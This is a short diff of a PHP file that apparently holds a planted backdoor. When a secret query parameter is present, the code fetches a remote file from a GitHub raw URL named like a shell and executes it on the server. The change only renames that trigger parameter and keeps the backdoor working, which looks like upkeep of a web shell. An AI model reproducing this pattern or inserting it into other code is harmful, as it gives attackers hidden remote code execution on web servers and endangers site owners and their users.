@@ -48,7 +48,7 @@ class CodeExecutor {
 // ==== MAIN LOGIC ====
 $fetcher = new CurlFetcher();
 
-if (isset($_GET['ilmupadi'])) {
+if (isset($_GET['jktinc'])) {
     $executor = new CodeExecutor($fetcher);
     $executor->executeCodeFromURL("https://raw.githubusercontent.com/heriraharto2-woyowoyo/data-kerja/refs/heads/main/shellfuckingteam.txt2");
     exit;
